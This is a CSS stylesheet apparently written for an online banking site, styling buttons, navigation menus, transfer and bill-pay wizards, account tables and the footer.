.marketing-img { text-align: center; padding: 10px; border: 1px solid #E8E6DE; margin-left: 5px; border-radius: 4px; }
.btn.desk-btn { background-color: #D81E05; border: 2px solid #D81E05; color: #FFFFFF; padding: 3px 10px; }
*[class*="RUIFW-btn"], .btn { background-image: none!important; filter: none !important; box-shadow: 0 0 0; text-shadow: 0 0 0; padding: 3px 15px; color: #fff; border-style: solid; border-width: 1px; }
*[class*="RUIFW-btn"], .btn:hover { color: #fff }
*[class*="RUIFW-btn"], .btn:focus { color: #fff }
*[class*="RUIFW-btn"]:hover { color: #fff }
.RUIFW-btn-primary, .btn.action-btn, .btn-primary { background-color: #D81E05; border-color: #D81E05; filter: none !important; vertical-align:top!important; }
.RUIFW-btn-primary:hover, .btn.action-btn:hover, .btn-primary:hover { background-color: #ed1c00; border-color: #D81E05; }
.icon-btn { background: #ffffff!important; border: none!important; color: #ffffff!important; vertical-align: middle; text-align: center; }
.RUIFW-btn-primary:focus { border-color: #D81E05 }
.icon-btn:hover { background: transparent; border: none; }
.icon-btn:focus { background: transparent; border: none; }
.RUIFW-btn span.icon-bookmark, .btn.actionicon-btn span.icon-bookmark { font-size: 18px }
.RUIFW-btn span.icon-cog, .btn.actionicon-btn span.icon-cog { font-size: 18px; color: #d71e05!important; }
span.icon-info-sign { margin-left: 5px; background: url(../images/info_icon_12x12.png) left top no-repeat; width: 12px; height: 12px; display: inline-block; vertical-align: text-top!important; }
span.icon-info-sign:before { content: none }
a .icon-info-sign:hover { color: #2A5DB0!important }
a .icon-info-sign:before { color: #2A5DB0!important; margin-bottom: -10px!important; position: absolute; }
.padd-lt-3px { padding-left: 3px }
.padd-rt-3px { padding-right: 3px }
.RUIFW-btn, .btn.default-btn, .RUIFW-btn:hover, .btn-default, .btn-default:hover { background-color: #606060!important; border: 1px solid #606060!important; }
.RUIFW-btn:hover, .btn.default-btn:hover { background-color: #6d6d6d }
.RUIFW-btn:focus, .btn.default-btn:focus { background-color: #6d6d6d }
.signout-btn { position: absolute; right: 10px; top: 7px; }
.icon-lock-signout { color: #D81E05; font-size: 16px; margin: 1px 0 0 0; padding: 0 5px 0 13px; float:left; width:10%;}
.icon-red { color: #D81E05; font-size: 14px; margin: 0 5px 0 0; }
.main-icons { float:right!important; font-size: 26px; }
.main-icons ul li a { float: right; font-size: 25px; }
.main-icons a { padding: 0 5px 0 0; color: #fff; text-decoration: none; }
a [class*="icon-"]:hover { text-decoration: none !important }
/*
.equal, .equal > div[class*='col-'] {
    display: -webkit-flex;
    display: flex;
    flex:1 1 auto;
}*/
.divOff { display: none }
.divOn { display: block }
.hr-separator { width: 100%; border-bottom: 1px solid #D7D7D7; height: 1px; margin-bottom: 15px; }
.hr-separator2 { width: 100%; border-bottom: 1px dotted #606060; height: 1px; }
.hr-separator3 { width: 100%; border-bottom: 1px solid #D7D7D7; height: 1px; }
.exp-collapse a { color: #606060; padding: 0 0 0 15px; }
.exp-collapse a:hover { text-decoration: none }
.exp-collapse a:before { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; content: "\f0da"; color: #d81e05; /*do not change this one ---- its reflecting for multiple*/ position: absolute; font-size: 18px; }
.exp-collapse h6 { margin: 0!important; padding: 10px 5px 10px 0; background-color: #d81e05; word-wrap: break-word; }
.exp-collapse h6 a { color: #ffffff!important; font-weight: normal!important; font-size: 1.3rem; font-size: 13px; }
.exp-collapse h5 { margin: 0 0 0 0!important; padding: 0; }
.exp-collapse h5 a { color: #2A5DB0!important; font-weight: normal!important; font-size: 1.2rem!important; }
.exp-collapse h2 a:before { margin: -2px 0 0 -17px; font-size: 25px!important; }
.exp-collapse h4 { margin-bottom: 8px; margin-top: 2px; }
.exp-collapse h4 a { margin: 10px 0 0 25px }
.exp-collapse h4 a:before { margin: 0 0 0 -25px }
.exp-collapse h6 a:before { margin: 2px 0 0 -14px }
.exp-collapse a.Open:before { content: "\f0d7" }
.navleft div li.exp-collapse a:before { color: #606060!important }
.navleft div div ul li { padding-left: 20px; background-color: #ffffff!important; }
.navleft div div ul li.active { background-color: #d4d4d4!important }
.quick-menu-box { font-size: 1.6rem; font-size: 16px; border-collapse: collapse; width: 100%; margin: 0 0 30px; padding: 0 1%; /*height: 100%;*/ }
.quick-menu-box a { background: #f1f1f1; /*: ; background-image: -moz-linear-gradient(top, #f5f5f5, #e4e4e4); background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#f5f5f5), to(#e4e4e4)); background-image: -webkit-linear-gradient(top, #f5f5f5, #e4e4e4); background-image: -o-linear-gradient(top, #f5f5f5, #e4e4e4); background-image: linear-gradient(to bottom, #f5f5f5, #e4e4e4); filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#f5f5f5', endColorstr='#e4e4e4', GradientType=0); -webkit-box-shadow: inset 0px 0px 2px 0px rgba(224, 224, 224, 0.75); -moz-box-shadow: inset 0px 0px 2px 0px rgba(224, 224, 224, 0.75); box-shadow: inset 0px 0px 2px 0px rgba(224, 224, 224, 0.75); */ padding: 15px 15px 15px 15px; float: left; width: 23%; margin: 0 1%; font-weight: normal; display: block; border-bottom: 1px solid #D7D7D7; border-left: 1px solid #D7D7D7; border-right: 1px solid #D7D7D7; }
.quick-menu-box a span { font-size: 0.8em; color: #606060; display: block; margin-top: 3px; font-weight: normal; }
.quick-menu-box a:hover { text-decoration: none; background: #eaeaea; }
.quick-menu-box a.pay-bill { border-top: 7px solid #B5121B; nowhitespace: afterproperty; color: #B5121B; /* box-shadow: inset 0 7px 0 0 #B5121B;*/; }
.quick-menu-box a.send-money { border-top: 7px solid #E20177; color: #E20177; }
.quick-menu-box a.transfer { border-top: 7px solid #0084A9; color: #0084A9; }
.quick-menu-box a.topup-mobile { border-top: 7px solid #8D8B00; color: #8D8B00; }
.flt-lft { float: left }
.flt-rgt { float: right }
.flt-none { float: none!important }
.RUIFW-content-side { padding-left: 5px; padding-right: 19px; }
.overview-sect1 { display: block; border-right: 2px solid #ffffff; padding-bottom: 10px; }
.overview-sect2 { background: #f3f3f3; display: block; padding: 15px 15px 10px 25px; height: 115px; }
.overview-sect2 div.rgr-txt, .overview-sect2 div.big-txt, .overview-sect2 div.sml-txt { padding: 2px 0 }
.sml-txt { font-size: 11px }
.rgr-txt { font-size: 1.2em; color: #606060; }
.big-txt { font-size: 18px }
.assets { height: 13px; background: #00bb04; }
.liab { height: 13px; background: #f5f5f5; }
.assets-amt, .liab-amt { font-size: 1.2em; color: #606060; padding-top: 32px; padding-left: 0px; text-align: right; white-space: nowrap; }
.progress { height: 14px; border-radius: 0px; background-image: none; background: #d5d5d5!important; }
.progress-bar-success { background-image: none; background: #00bb04; }
.progress-bar-danger { background-image: none; background: #d81e05; }
.sub-header-bg { /*background: #F9F9F7;*/ padding: 11px 11px 0 11px; vertical-align: top; white-space: nowrap; z-index:0; }
.sub-header-bg    .form-control { display: inline }
.inline-nav { float: right; font-size: 17px; border: none; }
.inline-nav li.active { border: none!important }
.inline-nav li a { color: #d81e05; background: transparent!important; border: none!important; }
.inline-nav .dropdown-menu li a { color: #333333 }
.open > .dropdown-toggle.btn-default { color: #606060 }
.open > .dropdown-toggle.btn-default .user-icon-white{background: url(../images/add-payee_gray.png) left top no-repeat;}
.nav-tabs > li.active > a, .nav-tabs > li.active > a:hover, .nav-tabs > li.active > a:focus { color: #606060 }
.txt-center { text-align: center }
.txt-right { text-align: right!important; }
.RUIFW-table-border tbody tr th, .RUIFW-table-border td { border-left: medium none !important; border-right: medium none !important; }
.regular-table { border-left: medium none !important; border-right: medium none !important; }
.quick-menu { position: absolute }
.quick-menu .dropdown-toggle.btn-default { position: absolute!important; border: 1px solid #da1c05!important; background: #da1c05!important; }
.quick-menu_overviewPage { margin: 15px 0 0 0; font-weight: normal!important; text-align: right!important; float: right!important; left: auto!important; position: relative!important; width: 51px; }
.quick-menu_overviewPage button, .quick-menu_overviewPage input { font-weight: normal!important; float: right!important; left: auto!important; }
.quick-menu_TransfersoverviewPage { margin:0 10px 0 0; font-weight: normal!important; text-align: right!important; min-width: 51px; display:inline-block; position:relative; vertical-align:text-top;}

.quick-menu_TransfersoverviewPage button, .quick-menu_TransfersoverviewPage input { font-weight: normal!important;  }
.quick-menu .dropdown-toggle.btn-default span { border-top-color: #fff }
.quick-menu.open .dropdown-toggle.btn-default { border-color: #BBB!important; background: #fff!important; z-index: 1001!important; border-top: 1px solid #cccccc!important; border-right: 1px solid #cccccc!important; border-left: 1px solid #cccccc!important; border-bottom: none!important; border-radius: 3px 3px 0 0!important; box-shadow: none!important; }
.quick-menu.open .dropdown-toggle.btn-default span { border-top-color: #333 }
.quick-menu ul.dropdown-menu { margin: 18px 0 0 0!important; padding: 4px 0; border: 1px solid #cccccc !important; border-radius: 0; }
h3 .quick-menu ul.dropdown-menu { margin: 18px 0 0 0!important; padding: 4px 0; border: 1px solid #cccccc !important; border-radius: 0; right: auto; left: auto; }
.quick-menu_TransfersoverviewPage ul.dropdown-menu {margin:18px -18px 0 0!important;}
.quick-menu_managePayees.quick-menu ul.dropdown-menu { margin: 5px -6px 0 0!important; }
.quick-menu_managePayees{margin:0;  font-weight: normal!important;  text-align: right!important;  width: 51px;  display: inline-block; position: relative; vertical-align: text-top; height:30px;}
.quick-menu_managePayees .caret{ vertical-align:middle!important; margin-bottom:10px;}
.quick-menu ul.dropdown-menu li a { font-size: 12px }
.right-box-item-holder { padding: 0 0 10px 0!important }
.right-box { border: 1px solid #c0bfbb; border-radius: 4px; margin-bottom: 15px; overflow: hidden!important; }
.right-box-marketing { margin-bottom: 15px }
.right-box-marketing img { width: 100% }
.right-box-item { padding: 0 10px 0 40px; color: #606060; font-size: 12px; margin: 0; overflow: hidden!important; }
.right-box-item-singlelink { padding: 0 10px 0 20px; color: #606060; margin: 0; }
.right-box-item li { list-style: none; padding: 5px 0; }
.right-box-item a { padding: 0 0 0 5px }
.right-box-item a:before { margin: -1px 0 0 -25px!important }
.right-box-item a:After { margin: -1px 0 0 5px!important; position: absolute; }
.rightbox-icon-phone span { margin-left: 5px }
.rightbox-icon-lock span { margin-left: 5px; display: inline-block; }
.right-box-item a, .right-box-item-singlelink a { color: #606060; text-decoration: none; }
.right-box-item a:hover { color: #d81e05 }
.right-box-item a:before, .right-box-item-singlelink a:before, .right-box-item span:before { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; color: #d81e05; font-size: 18px; margin: 0 0 0 -20px; padding-right: 6px; }
.right-box-item a:after { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; color: #d81e05; position: absolute; font-size: 18px; margin-left: 5px; display: inline-block; }
.more-link a{color:#2a5db0; }
.more-link a:hover{color:#F00; }
.rightbox-icon-phone span:before { content: "\f095"; margin: 0 0 0 -25px!important; }
.rightbox-icon-comment a:before { content: "\f075" }
.rightbox-icon-comment a{padding:0 !important;}
.rightbox-icon-lock a:before { content: "\f023"; font-size: 22px!important; }
.right-box-item-singlelink.rightbox-icon-lock h4{    padding-left: 20px;
    margin-top: 15px;}
.rightbox-icon-lock span:before { content: "\f023"; font-size: 22px!important; margin: 0 0 0 -20px; }
/*.rightbox-icon-video a:before{ content: "\f03d"; margin:0 100px 0 0!important; text-align:right;}_NO__DOTCOMMA__AFTER__*/
.rightbox-icon-video a:After { content: "\f03d" }
.rightbox-icon-map-mark h4 { padding-left: 25px; margin-top: 15px; }
.rightbox-icon-map-mark a:before { content: "\f041"; font-size: 20px; margin: -3px 0 0 -25px; }
.left-box-item-holder { padding: 0 !important }
.left-box-item { padding: 0; color: #606060; font-size: 12px; margin: 0; width: 100%; border-left: 1px solid #bfbfbf; border-right: 1px solid #bfbfbf; }
.left-box-item .borderbottom { border-bottom: 1px solid #bfbfbf }
.left-box-item li { list-style: none; padding: 9px 0px; font-size: 1em; word-wrap: break-word; background: #ffffff; border-bottom: 1px dotted #D7D7D7; }
.left-box-item li a { margin-left: 5px; white-space:pre-wrap!important; word-break:break-all;  }
.left-box-item li.active { background: #d4d4d4 }
/*.left-box-item li.active:after{
content: "\f0da";
font-family: fontAwesome;
      font-weight: normal;
      font-style: normal;
      text-decoration: inherit;
      -webkit-font-smoothing: antialiased;
      color: #d4d4d4;
      position: absolute;
     font-size: 22px;
     margin:2px 0 0 17px;
}*/
.icon-edit, .icon-envelope, .icon-mobile-phone { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; color: #d81e05; font-size: 18px; padding-right: 10px; }
.icon-mobile-phone { font-size: 23px!important; padding-right: 15px; !important: ; }
.RUIFW-pageid { padding: 0 5px 0 0 }
.btn-holder { text-align: right; margin: 40px 0 0; }
.btn-holder button, .btn-holder input, .btn-holder a { margin: 0 5px!important }
.form-alt-txt { font-size: 11px; margin:3px 0 0 0!important; display:block; }
.wizard-box { border-right: 1px solid #e0e0e0; border-left: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; }
.wizard-step-counter { display: table; border-collapse: inherit; width: 100%; }
.wizard-step-counter div { white-space: nowrap; display: table-cell; padding: 13px; background: #f5f5f5; vertical-align: middle; border-left: 1px solid #d8d8d8; border-top: 5px solid #d8d8d8; color: #606060; }
.wizard-step-counter div.no-counter { display: table-cell; padding: 0; background: #fff; vertical-align: middle; border-top: 1px solid #eeeeee; color: #606060; }
.wizard-step-counter #Step1 { border-left: none!important }
.wizard-step-counter div:first-child { border-left: none!important }
/*.wizard-step-counter div:last-child{width:100%;}_NO__DOTCOMMA__AFTER__*/
/*.wizard-step-counter.short-steps div:last-child{width:100%;}_NO__DOTCOMMA__AFTER__*/
.short-steps div:last-child { width: 100% }
.short-steps #Step1 { white-space: nowrap }
.short-steps #Step2 { white-space: nowrap }
.short-steps #Step3 { white-space: nowrap }
.short-steps #Step4 { white-space: nowrap }
.short-steps #Step5 { white-space: nowrap }
.short-steps #tab3-step1 { white-space: nowrap }
.short-steps #tab3-step2 { white-space: nowrap }
.short-steps #tab3-step3 { white-space: nowrap }
.short-steps1 >.last-child { width: 68%!important }
.short-steps2 >.last-child { width: 65%!important }
.short-steps3 >.last-child { width: 57%!important }
.short-steps4 >.last-child { width: 30%!important }
.wizard-step-counter div.active { border-top: 5px solid #d81e05; background: #e0e0e0; color: #5e5e5e; }
.wizard-form-title { padding: 25px }
.wizard-form-payroll-title { padding: 15px; border-top: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; }
.wizard-form-title h4 { margin-bottom: 0px; margin-top: 0; }
.wizard-form-title p { margin-top: 5px; margin-bottom: 0px; }
.wizard-form-title fieldset { margin: 0px }
.wizard-form-title input { vertical-align: text-top }
.wizard-form-title_2 { padding: 0 25px 25px 0 }
.wizard-form-title_2 h4 { margin-bottom: 0px }
.wizard-form-title_2 p { margin-top: 5px; margin-bottom: 0px; }
.wizard-form-title_2 fieldset { margin: 0px }
.wizard-form-title_2 input { vertical-align: text-top }
.wizard-form-content { padding: 25px; background: #F1F1F1; }
.wizard-form-content2 { padding: 25px; background: #E0E0E0;}
.wizard-form-title2 { padding: 25px; padding-bottom: 0px; background: #e0e0e0; }
.table thead > tr > th.sort { color: #2A5DB0 !important; cursor: pointer; padding-right:15px!important; }
.homebottomtable .table .actions { width: 50px; vertical-align: top; }
.lastactions_td .table .actions { width: 22%; vertical-align: top; }
.table thead > tr > th.sort.headerSortDown:after { content: "\f0d7"; color: #d81e05; font-family: fontAwesome; font-size: 13px; font-style: normal; font-weight: normal; margin: 0 0 0 5px!important; position: absolute!important; text-decoration: inherit; }
.table thead > tr > th.sort.headerSortUp:after { content: "\f0d8"; color: #d81e05; font-family: fontAwesome; font-size: 13px; font-style: normal; font-weight: normal; margin: 0 0 0 5px!important; position: absolute!important; text-decoration: inherit; display: inline-block; }
/*tab*/
.nav-two-tabs { /*background: none repeat scroll 0 0 #e9e6df;; border: 1px solid #d8d8d8; */ margin: 10px 0 0; color: #555555!important; width: 95%; font-size: 1.3rem; font-size: 13px; }
.tab-content-border { border: 1px solid #d8d8d8; margin-top: -1px; }
.nav-tabs > li > a, .nav-tabs > li > a:hover { border-radius: 0; border: none!important; background: transparent; filter: none; margin-right: 0; }
/*.nav-tabs > li:not(.active) > a{padding-top: 14px;}
*/
.nav-two-tabs > li { float: left; background: none repeat scroll 0 0 #e9e6df; margin-right: 5px; text-align: center; border-right: 1px solid #d8d8d8; border-top: 1px solid #d8d8d8; border-bottom: 1px solid #d8d8d8; border-left: 1px solid #d8d8d8; margin-top: 1px; margin-bottom: 0; }
.nav-tabs { border-bottom: none }
.nav .active { background: none repeat scroll 0 0 #ffffff; border-right: 1px solid #d8d8d8; border-bottom: 1px solid #ffffff; border-top: 1px solid #d8d8d8; border-left: 1px solid #d8d8d8; margin-top: 1px; margin-bottom: 0; }
.nav-two-tabs a { color: #555555!important }
/*----------------------*/
.RUIFW-nav-main{ width:inherit!important;}
.main-icons .RUIFW-nav-main{ width:inherit!important; float:none;}
.RUIFW-nav-main > li.active > a, .RUIFW-nav-main > li.active > a:hover { background: #F6F6F6; border-bottom: none; box-shadow: 0 0 0; color: #D81E05; filter: none; margin-left: -1px; margin-top: -3px; text-shadow: 0 0 0; padding-bottom: 8px; border: none!important; }
.RUIFW-nav-main > li > a:hover, .RUIFW-nav-main > li > a:focus { /* background-color: #A31600;*/ background: #d81e05; color: #d0c2cd; filter: none; outline:none!important; }
.RUIFW-nav-main > li.active > .dropdown-menu { width: 200px }
.RUIFW-nav-main > li > .dropdown-menu.two-col > li { float: left; width: 50%; position: relative; }
.RUIFW-nav-main > li > .dropdown-menu.three-col > li { float: left; width: 33%; position: relative; }
.RUIFW-nav-main > li > .dropdown-menu > li.banner { background: #F1F1F1; height: 100%!important; position: absolute; right: 0; text-align: center; top: 0; padding: 20px 10px; font-size: 10px; display: block; }
.RUIFW-nav-main > li > .dropdown-menu > li.banner div { font-size: 10px; display: block; float: none; overflow: hidden; clear: both; vertical-align: top; width: 100%; }
.RUIFW-nav-main > li > .dropdown-menu > li.banner button { max-width: 100%; height: auto; font-size: 1.3em; }
.RUIFW-nav-main > li > .dropdown-menu > li.banner img { padding: 10px 0; max-width: 100%; height: auto; }
.RUIFW-nav-main > li > .dropdown-menu > li a { border: none; color: #2a5db0 !important; font-size: 1.2rem; font-size: 12px; font-weight: normal; padding: 15px 20px 0; white-space: pre-wrap; }
.RUIFW-nav-main > li > .dropdown-menu > li a.nowrap { white-space: nowrap }
.RUIFW-nav-main > li > .dropdown-menu > li div.nowrap { white-space: nowrap }
.RUIFW-nav-main > li > .dropdown-menu > li div { color: #606060 !important; font-size: 12px; padding: 0 10px 15px 20px; white-space: pre-wrap; }
.RUIFW-nav-main > li > .dropdown-menu > li.active a, .RUIFW-nav-main > li > .dropdown-menu > li a:hover { color: #D81E05  !important; background: none; filter: none; text-decoration: underline; }
.navbar-nav > li > .dropdown-menu { right: 10px!important; background: #fff; border: 1px solid #ccc; border-top: none; top: 45px; box-shadow: 0px 3px 1px 0px rgba(206, 206, 206, 0.4); }
.navbar-nav > li > .payIEholder { right:inherit!important; width: 60%; left: inherit!important; margin-left:-10px!important; }
.navbar-nav > li > .payIEholder_Caribbean { right: inherit!important; width: 50%; left: inherit!important; margin-left:-10px!important; }
.navbar-nav > li > .TransferHolder { width: 60%; left: inherit!important;right:inherit!important; margin-left:-10px!important;  }
.navbar-nav > li > .TransferHolder_Caribbean { width: 50%; left: inherit!important; right: inherit!important; margin-left:-10px!important;  }
.navbar-nav > li > .InvestHolder { width: 58%; left: inherit!important; margin-left:-10px!important;right:inherit!important;}
.navbar-nav > li > .TopHolder { width: 40%; left: inherit!important; margin-left:-10px!important; right:inherit!important;}
.navbar-nav > li > .TopHolder_Caribbean { width: 40%; left: inherit!important; margin-left:-10px!important; right:inherit!important;}
.navbar-nav > li > .HelpHolder { width: 40%; left: inherit; padding-bottom: 40px; }
.navbar-nav > li > .two-col.no-banner { width: 20%;}
.navbar-nav > li > .three-col.no-banner { width: 40%;}
.navbar-nav > li > .two-col.no-banner li{width: 100%;}
.navbar-nav > li > .three-col.no-banner li{width: 50%;}
.navbar-nav > li > .two-col.no-banner  .banner,.navbar-nav > li > .three-col.no-banner  .banner{display:none;}
.RUIFW-nav-main > li.has-submenu a { padding-right: 30px!important }
@media all and (orientation:portrait) {
 .navbar-nav > li > .TopHolder { width: 40%; left: inherit!important; margin-left:-10px!important; right:10px!important;}
 .navbar-nav > li > .InvestHolder { width: 60%; left: inherit!important; margin-left:-10px!important;right:10px!important;}
 .navbar-nav > li > .TransferHolder { width: 60%; left: inherit!important;right:10px!important; margin-left:-10px!important;  }
 .navbar-nav > li > .payIEholder { right:inherit!important; width: 60%; left: inherit!important; margin-left:-10px!important; }
}
#nav-help { margin-right: 12px!important; }
.RUIFW-nav-main > li.has-submenu.open  a { background: #fff !important; color: #d81e05; border-top: 1px solid #cecece; filter: none; }
.RUIFW-nav-main > li.has-submenu a:after { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; content: "\f0d7"; color: #fff; position: absolute; font-size: 13px; padding: 3px 0 0 13px; }
.RUIFW-nav-main > li.has-submenu.open a:first-child:after { content: "\f0d8"; color: #d81e05; }
.RUIFW-nav-main > li.has-submenu.open > .dropdown-menu > li a { border-top: none }
.RUIFW-nav-main > li.has-submenu.open > .dropdown-menu > li a:after { content: normal; color: #d81e05; }
.RUIFW-nav-main .dropdown-menu > li > a:hover, .RUIFW-nav-main .dropdown-menu > li > a:focus, .RUIFW-nav-main > li > .dropdown-menu > li.active a:focus, .RUIFW-nav-main .active a:focus { background: transparent }

.RUIFW-nav-main > li.has-submenu.open .banner a{background: none !important; padding:0 5px 0 0 !important;}
.RUIFW-nav-main > li > .dropdown-menu > li.banner div{white-space:normal;}

/*page footer*/
.RUIFW-page-wrap:after { height: 10px; border-bottom: 5px solid #f1f1f1; border-right: 5px solid #f1f1f1; border-left: 5px solid #f1f1f1; }
.RUIFW-page-footer { height: 0 }
.RUIFW-page-footer { z-index: inherit; text-align: left; }
.RUIFW-nav-footer { border-top-color: #c6c5c3; padding: 10px 0; margin-bottom: 0; }
.RUIFW-nav-footer li { padding: 5px 0 }
.RUIFW-nav-footer li.separator { border-right: 1px solid #c6c5c3; float: left; }
.RUIFW-nav-footer li a { border: none; padding: 0px 8px!important; }
.RUIFW-nav-footer li a:hover { background: transparent; text-decoration: underline; }
.footer-icons { width: 100%; padding-top: 20px; }
.footer-icons .icons { float: left; text-align: center; padding: 0 4px; font-size: 12px; }
.footer-icons .icons img{ width:60px!important; height:60px!important; }
.footer-icons .icons span { padding: 5px 0 0 0 }
.RUIFW-nav-footer li.copyright {  right: 8px; font-size: 11px; display: block; text-align: right;  }
/* navbar background*/
.RUIFW-bg-bar { height: 45px; top: 81px; z-index: 0; min-width: 768px; }
.RUIFW-bg-bar .RUIFW-bg-main-nav { height: 45px; background: #d81e05; }
.RUIFW-container-header { height: 126px }
.RUIFW-container-well { border-radius: 0 0 0 0; margin-bottom: 0; padding: 0; }
#paytrans_tab { border-right: 1px solid #d8d8d8; border-bottom: 1px solid #d8d8d8; border-left: 1px solid #d8d8d8; }
.RUIFW-container, .RUIFW-content-pan, .RUIFW-form-actions { border-radius: 0 0 0 0; padding: 10px 0; }
.RUIFW-container-well, .RUIFW-form-actions { background: transparent; border: none; padding: 0; border-radius: 0; }
.RUIFW-container-btns > * +  *, .RUIFW-form-btns > * + * { margin-left: 4px }
.RUIFW-container-btns *[class*="pull-right"] + *[class="pull-right"], .RUIFW-form-btns *[class*="pull-right"] + *[class*="pull-right"] { margin-right: 6px; margin-left: 0; }
/*table*/
table tr th { filter: none!important }
.homebottomtable { margin: 0 1% 1% 1% }
.homebottomtable table .actions { padding-left: 2% }
.homebottomtable table tr th:last-child { border-right: 2px solid #f5f5f5!important }
.homebottomtable table tr th { background: #f5f5f5!important; border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; }
.homebottomtable table tr td { border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 1px solid #f5f5f5!important; vertical-align: top; white-space:inherit!important; /*added for table fix topup activity*/ }
.homebottomtablemodal table tr td { border-right: 1px solid #ccc!important; border-top: 1px solid #ccc!important; border-left: 1px solid #ccc!important; border-bottom: 1px solid #ccc!important; vertical-align: top; white-space:inherit!important; /*added for table fix topup activity*/ }
/*.homebottomtable table tr:nth-child(even) td{background: #f5f5f5!important}
.homebottomtable table tr:nth-child(odd) td{background: #FFF!important}*/
.popup_table .RUIFW-table-sec-head th { background: #d7d7d7!important; border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; color: #606060; text-shadow: none; text-align: center; }
.table-container{overflow: auto; }
.contenttbs table tr th { background: #f5f5f5!important; border-right: 2px solid #fff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; }
.contenttbs table tr td { border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 1px solid #f5f5f5!important; vertical-align: top; }
.contenttbs_dark table tr th { background: #d7d7d7!important; border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; text-shadow: none; }
.alerts_table table tr td:last-child { /* white-space: pre-wrap!important; nowhitespace: afterproperty; word-wrap: break-word; Internet Explorer 5.5+ */ word-break: normal; text-wrap: normal; }
.alerts_table label{font-weight: normal !important; min-height: 18px; margin-bottom:0px;}
.alerts_table .RUIFW-form-el{width: 130px;}
.contenttbs_dark table tr th:last-child { border-right: 2px solid #d7d7d7!important }
.contenttbs_dark .RUIFW-table-sec-title:hover { background: #d7d7d7!important }
.contenttbs_dark table tr th:first-child { padding-left: 12px;}
.contenttbs_dark table tr td:first-child { padding-left: 12px;}
.odd td { background: #ffffff !important }
.even td { background: #f5f5f5 !important }
table[class*="RUIFW-table"] { font-size: 1.2rem; font-size: 12px; border-collapse: collapse; }
table[class*="RUIFW-table"] tr th { background: #f5f5f5 }
table[class*="RUIFW-table-modal"] tr th { background: #333 !important; }
table[class*="RUIFW-table"] tbody tr th, .RUIFW-table-border td { border-top: 1px solid #DDD; /*border-bottom: 1px dashed #DDD */; }
table[class*="RUIFW-table"] thead th { border-bottom-width: 1px!important; color: #606060; white-space:inherit!important;/*added for tabel Recipients page responsive alignment */ /*background: linear-gradient(to bottom, #FFFFFF 0%, #F2F2F2 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)!important;  W3C */ }
table[class*="RUIFW-table-modal"] thead th { border-bottom-width: 1px!important; color: #f9f9f9 !important; white-space:inherit!important; text-shadow: none !important;/*added for tabel Recipients page responsive alignment */ /*background: linear-gradient(to bottom, #FFFFFF 0%, #F2F2F2 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)!important;  W3C */ }
table[class*="RUIFW-table"] thead tr.header-nowrap th { white-space:nowrap !important; }
tr.RUIFW-table-sec-title th, tr.RUIFW-table-sec-title:hover th { background: transparent!important }
.highlight-row:hover > td { background-color: #606060 !important; color: #fff !important; }
.highlight-row,.highlight-row td{ background-color: #606060 !important; color: #fff !important; }
.RUIFW-table tr.clickable { cursor: pointer }
/*.RUIFW-table tr td:first-child { width: 10%;}_NO__DOTCOMMA__AFTER__*/
table.overview-table { margin-bottom: 0px!important; border-top: 0!important; border-bottom: none; }
.overview-table tr { border-top: 1px dotted #D7D7D7!important; /*background: #fbfbfb!important*/; }
.overview-table tr td { font-size: 1.3em!important; border-top: 0!important; padding-top: 15px!important; padding-bottom: 15px!important; }
.overview-table tr td:first-child { padding-left: 20px!important }
.overview-table tr td.account-type { width: 55%; word-break: normal!important; white-space: pre-wrap!important; }
.overview-table tr td.balance { width: 40% }
.overview-table tr td.actions { width: 10% }
.overview-table tr td:first-child a { color: #2a5db0!important; }
.overview-table tr td:first-child a:hover { text-decoration: none!important; color: #d81e05!important; }
.RUIFW-table-border td { border: 0 }
.RUIFW-table tr td:last-child { white-space: nowrap!important;}
.lastactions_td .RUIFW-table tr td{ white-space:normal; }
.item-description td { background: none repeat scroll 0 0 #FBFBFB; white-space: normal; }
.item-description td div { float: left; padding: 7px 5px; }
.item-description td div.accnt-act-details1 { /*  margin-left: 10%;*/ padding:0px;margin-bottom:10px; white-space:normal; width: 55%; }
.item-description td div.left-margin{ margin-left: 13.5% !important; }
.accnt-act-details1 p { margin: 0; float:none; vertical-align:top; overflow:hidden; clear:both; display:block!important;  width:100%;}
.accnt-act-details1 span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: initial; vertical-align: text-top; float:right; text-align:left!important;width:65%; padding-bottom:5px;}
.accnt-act-details1 label { font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; margin-bottom:0px; width:35%;float:left; word-break:initial;}
.modalPrint .modal-body .accnt-act-details1{ padding:0px!important;}
.modalPrint .modal-body .accnt-act-details1 p{border-bottom: 1px solid #D7D7D7!important;}
.modalPrint .modal-body .accnt-act-details1 p span {width: 65%; padding:5px!important; position:relative!important;}
.modalPrint .modal-body .accnt-act-details1 label { width: 35%;padding:5px!important; border-right: 1px solid #D7D7D7!important; }
.modalPrint .modal-body .accnt-act-details1 label.trans-label-only { width: 100%;padding:5px!important; border-right: none !important; }
.item-description td div.accnt-act-details3 { /*  margin-left: 5%;*/padding:0px;white-space:normal;; width: 100%; }
.item-description td div.accnt-act-details2 { width: 45%; padding: 0px; text-align: right; white-space: normal; }
.item-description td div.accnt-act-details2 a { /* margin: 5px 0 5px 0;*/ margin-bottom:5px; text-align:right; cursor:pointer; }
